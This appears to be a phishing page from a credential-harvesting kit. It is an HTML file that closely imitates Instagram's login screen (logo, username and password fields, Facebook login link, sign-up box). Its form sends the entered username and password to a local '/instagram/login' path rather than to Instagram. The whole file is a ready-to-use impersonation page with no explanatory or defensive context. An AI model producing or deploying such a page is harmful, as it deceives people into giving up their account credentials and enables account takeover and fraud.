<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
    background:#fafafa; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
  .box { width:100%; max-width:350px; background:#fff; border:1px solid #dbdbdb;
         padding:40px 35px 20px; text-align:center; border-radius:1px; }
  .logo { font-family:'Billabong','Segoe Script',cursive; font-size:42px; margin-bottom:30px;
          background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
          -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
  input { width:100%; padding:10px 8px; font-size:14px; border:1px solid #dbdbdb;
    border-radius:3px; margin-bottom:6px; background:#fafafa; outline:none; }
  input:focus { border-color:#a8a8a8; }
  .btn { width:100%; background:#0095f6; color:#fff; border:none; padding:8px;
    font-size:14px; font-weight:600; border-radius:8px; margin-top:10px; cursor:pointer; }
  .btn:hover { background:#1877f2; }
  .or { display:flex; align-items:center; margin:20px 0; color:#8e8e8e; font-size:12px; font-weight:600; }
  .or hr { flex:1; border:none; border-top:1px solid #dbdbdb; }
  .or span { margin:0 18px; }
  .fb { color:#385185; font-size:14px; font-weight:600; text-decoration:none;
        display:inline-flex; align-items:center; gap:6px; margin-bottom:14px; }
  .forgot { color:#00376b; font-size:12px; text-decoration:none; }
  .signup { width:100%; max-width:350px; background:#fff; border:1px solid #dbdbdb;
    padding:20px; text-align:center; font-size:14px; margin-top:12px; border-radius:1px; }
  .signup a { color:#0095f6; font-weight:600; text-decoration:none; }
  @media (max-width:400px) { body { padding:0; }
    .box, .signup { border:none; max-width:100%; } }
</style>
</head>
<body>
  <div style="display:flex; flex-direction:column; align-items:center; width:100%;">
    <div class="box">
      <div class="logo">Instagram</div>
      <form action="/instagram/login" method="POST">
        <input type="text" name="email" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="btn">Log in</button>
      </form>
      <div class="or"><hr><span>OR</span><hr></div>
      <a href="#" class="fb">Log in with Facebook</a><br>
      <a href="#" class="forgot">Forgot password?</a>
    </div>
    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
